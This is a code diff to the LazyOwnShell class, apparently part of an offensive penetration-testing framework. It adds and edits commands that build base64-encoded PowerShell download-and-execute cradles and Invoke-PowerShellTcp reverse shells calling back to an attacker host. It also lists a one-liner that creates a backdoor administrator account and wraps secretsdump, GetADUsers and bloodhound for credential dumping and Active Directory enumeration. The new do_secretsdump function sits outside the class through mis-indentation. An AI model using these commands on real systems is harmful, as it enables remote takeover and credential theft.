@@ -3360,12 +3360,17 @@ class LazyOwnShell(Cmd):
                     params = file_line.split(":")
                     user = params[0]
                     passwd = params[1].replace("\n", "")
-                    dc = input("enter DC subdomain example dc01: ")
+                    dc = input("enter DC subdomain example dc01: (Default: none)")
+                    
+                    if  dc:
+                        sub = f" -gc '{dc}.{domain}' "
+                    else:
+                        sub = " "
                     print_msg(
-                        f"    {GREEN}[*] Try... bloodhound-python -u '{user}' -p '{passwd}' -d '{domain}' -gc '{dc}.{domain}' -ns {rhost} -c all --zip"
+                        f"    {GREEN}[*] Try... bloodhound-python -u '{user}' -p '{passwd}' -d '{domain}' {sub} -ns {rhost} -c all --zip"
                     )
                     os.system(
-                        f"cd sessions && bloodhound-python -u '{user}' -p '{passwd}' -d '{domain}' -gc 'dc01.{domain}' -ns {rhost} -c all --zip"
+                        f"cd sessions && bloodhound-python -u '{user}' -p '{passwd}' -d '{domain}' {sub} -ns {rhost} -c all --zip"
                     )
         return
 
@@ -5216,7 +5221,7 @@ class LazyOwnShell(Cmd):
             ("PYPYKATZ", "pypykatz registry --sam sam system"),
             ("WIN WEB Inyection", "abc.txt | powershell -enc "),
             ("WIN WEB Inyection" ,'abc.txt | net user lazyown abc123! /add ; net localgroup administrators lazyown /add'),
-            ("WIN ReverShell winbase64encode", f'echo -n "IEX(new-objectnet.webclient).downloadstring(\'http://{lhost}/Invoke-PowerShellTcp.ps1\')" | iconv -t UTF-16LE | base64 -w0'),
+            ("WIN ReverShell winbase64encode", f'echo -n "IEX(New-Object System.Net.WebClient).DownloadString(\'http://{lhost}/Invoke-PowerShellTcp.ps1\')" | iconv -t UTF-16LE | base64 -w0'),
             ("WIN ReverShell echo", f"echo 'Invoke-PowerShellTcp -Reverse -IPAddress {lhost} -Port {lport}' >> sessions/Invoke-PowerShellTcp.ps1"),            
             ("WIN enum Reg", "reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated"),
             ("WIN enum Policy", "get-applockerpolicy -effective | select -expandproperty rulecollections"),
@@ -9446,24 +9451,32 @@ class LazyOwnShell(Cmd):
             print_error(f"Url must be set use{GREEN} set url http://example.com")
             return
         domain = get_domain(url)
-        file = "sessions/credentials.txt"
-        if os.path.exists(file):
-            with open(file, "r") as f:
-                for file_line in f:
-                    params = file_line.split(":")
-                    user = params[0]
-                    passwd = params[1].replace("\n", "")
-                    choice = input("    [!] Credentials found use Digest or basic (1 or 2) :")
-                    if choice == "1":
-                        auth_type = "Digest"
-                    else:
-                        auth_type = "basic"
-                    extra = f"--auth_type {auth_type} --auth_user {user} --auth_pass {passwd} "
+        if not os.path.exists('sessions/credentials.txt'):
+            command = f"cewl -d 2 -m 5 -w sessions/cewl_{domain}.txt {extra} -v {url}"
+            print_msg(command)
+            os.system(command)
 
-        command = f"cewl -d 2 -m 5 -w sessions/cewl_{domain}.txt {extra} -v {url}"
-        print_msg(command)
-        os.system(command)
-        return
+        else:
+
+            credentials = get_credentials()
+            if not credentials:
+                return
+
+            for uname, passwd in credentials:
+                password = passwd
+                username = uname
+
+            choice = input("    [!] Credentials found use Digest or basic (1 or 2) :")
+            if choice == "1":
+                auth_type = "Digest"
+            else:
+                auth_type = "basic"
+            extra = f"--auth_type {auth_type} --auth_user {username} --auth_pass {password} "
+
+            command = f"cewl -d 2 -m 5 -w sessions/cewl_{domain}.txt {extra} -v {url}"
+            print_msg(command)
+            os.system(command)
+            return
 
     def do_dmitry(self, line):
         """
@@ -13529,27 +13542,13 @@ class LazyOwnShell(Cmd):
             path = os.getcwd()
             if not check_lhost(lhost):
                 return
-            file_rev = f"{path}/sessions/win/payload.ps1"
-            file_rev_ses = f"{path}/sessions/payload.ps1"
-            with open(file_rev, 'r') as f:
-                rev_content = f.read()
-
-            rev_content = rev_content.replace("{lhost}",lhost).replace("{lport}",str(lport))
-
-            with open(file_rev_ses, 'w+') as f:
-                f.write(rev_content)
-
-            if not is_exist(file_rev_ses):
-                print_error("Error: payload.ps1 file was not created.")
-                return
-            else:
-                with open(file_rev_ses, 'r') as f:
-                    content = f.read()
-                    if not content.strip():
-                        print_error("Error: payload.ps1 file is empty.")
-                        return            
-            
-            payload = "IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/payload.ps1')".replace("{lhost}",lhost)
+            download = "cd sessions && wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1"
+            print_msg(download)
+            os.system(download)
+            editor = f"echo 'Invoke-PowerShellTcp -Reverse -IPAddress {lhost} -Port {lport}' >> Invoke-PowerShellTcp.ps1"
+            print_msg(editor)
+            os.system(editor)
+            payload = "IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/Invoke-PowerShellTcp.ps1')".replace("{lhost}",lhost)
             print_msg(payload)
             utf16_command = payload.encode('utf-16le')
             base64_command = base64.b64encode(utf16_command).decode('utf-8')
@@ -14147,6 +14146,171 @@ class LazyOwnShell(Cmd):
             print_error(f"Failed to open or process the file: {str(e)}")
 
         return
+
+    def do_mssqlcli(self, line):
+        """
+        Attempts to connect to an MSSQL server using the mssqlclient.py tool with Windows authentication.
+
+        The function retrieves the necessary parameters (remote host and domain) from the 
+        instance's parameter dictionary. If a credentials file exists in the 'sessions_dir', 
+        it reads the file and uses the username/password combinations found there. If the file 
+        does not exist, it prompts the user for a username and password. 
+
+        The password is copied to the clipboard for convenience. A command is constructed using 
+        the mssqlclient.py tool, and it is then executed to initiate the connection to the MSSQL 
+        server.
+
+        Args:
+            line (str): The password input from the command line or an empty string if not provided.
+
+        Returns:
+            None
+        """
+        sessions_dir = "sessions"
+        rhost = self.params["rhost"]
+        domain = self.params["domain"]
+        if os.path.exists(os.path.join(sessions_dir, 'credentials.txt')):
+            credentials = get_credentials()
+            if not credentials:
+                return
+
+            for user, passwd in credentials:
+                password = passwd
+                username = user
+        else:
+            username = input(f"{GREEN}    [!] Enter the username: ")
+            password = line if line else input(f"{GREEN}    [!] Enter the master password: ")
+            
+        try:
+            copy2clip(password)
+            command = f"mssqlclient.py {domain}/{username}@{rhost} -windows-auth"
+            print_msg(command)
+            os.system(command)
+            return
+
+        except Exception as e:
+            print_error(f"Failed to Connect with the mssql: {str(e)}")
+
+        return
+
+    def do_getadusers(self, line):
+        """
+        Executes the GetADUsers.py script to retrieve Active Directory users.
+
+        The function retrieves the necessary parameters (domain controller IP and domain) from the 
+        instance's parameter dictionary. If a credentials file exists in the 'sessions_dir', 
+        it reads the file and uses the username/password combinations found there. If the file 
+        does not exist, it prompts the user for a username and password.
+
+        The password is copied to the clipboard for convenience. A command is constructed using 
+        the GetADUsers.py tool, and it is then executed to enumerate Active Directory users.
+
+        Args:
+            line (str): The password input from the command line or an empty string if not provided.
+
+        Returns:
+            None
+        """
+        sessions_dir = "sessions"
+        rhost = self.params["rhost"]
+        domain = self.params["domain"]
+
+        if os.path.exists(os.path.join(sessions_dir, 'credentials.txt')):
+            credentials = get_credentials()
+            if not credentials:
+                return
+
+            for user, passwd in credentials:
+                password = passwd
+                username = user
+            command = f"GetADUsers.py {domain}/{username} -dc-ip {rhost} -debug"
+            try:
+                copy2clip(password)
+                
+                print_msg(command)
+                os.system(command)
+                return
+
+            except Exception as e:
+                print_error(f"Failed to execute GetADUsers: {str(e)}")
+
+        else:
+        
+            txt_files = [f for f in os.listdir(sessions_dir) if f.endswith('.txt')]
+
+            if not txt_files:
+                print_error("No .txt files found in the 'sessions' directory.")
+                return
+
+            print_msg("Available .txt files:")
+            for idx, file in enumerate(txt_files):
+                print_msg(f"{idx}: {file}")
+
+            try:
+                file_index = int(input(f"    {GREEN}[!] Select the file number to use: "))
+                selected_file = txt_files[file_index]
+            except (IndexError, ValueError):
+                print_error("Invalid selection.")
+                return
+
+            selected_file_path = os.path.join(sessions_dir, selected_file)
+            try:
+        
+                with open(selected_file_path, 'r') as file:
+                    for line in file:
+                        username = line.strip()
+                        if username:
+                            command = f"GetADUsers.py {domain}/{username} -no-pass -dc-ip {rhost} -debug -k 2>/dev/null"
+                            print_msg(f"Executing: {command}")
+                            os.system(command)
+            except Exception as e:
+                print_error(f"Failed to execute GetADUsers for users in {selected_file_path}: {str(e)}")
+
+        return
+
+def do_secretsdump(self, line):
+    """
+    Executes the secretsdump.py script to extract NTLM hashes and credentials from the specified domain controller.
+
+    This function retrieves the necessary parameters (domain controller IP and domain) from the instance's
+    parameter dictionary. It checks for a credentials file in the 'sessions' directory. If the file exists,
+    it reads the username and password combinations from it. If not, it prompts the user for input. The password
+    is copied to the clipboard for convenience. A command is constructed using the secretsdump.py tool, and it is
+    executed to perform the dump.
+
+    Args:
+        line (str): The username input from the command line or an empty string if not provided.
+
+    Returns:
+        None
+    """
+    sessions_dir = "sessions"
+    rhost = self.params["rhost"]
+    domain = self.params["domain"]
+   
+    if os.path.exists(os.path.join(sessions_dir, 'credentials.txt')):
+        credentials = get_credentials()
+        if not credentials:
+            return
+
+        for uname, passwd in credentials:
+            password = passwd
+            username = uname
+            command = f"secretsdump.py {domain}/{username}@{rhost} -just-dc-user Administrator"
+            try:
+                copy2clip(password)
+                print_msg(command)
+                os.system(command)
+                return
+
+            except Exception as e:
+                print_error(f"Failed to execute secretsdump: {str(e)}")
+
+    else:
+        print_error("No credentials file found in the 'sessions' directory.")
+        return
+
+    return
 
 
 if __name__ == "__main__":
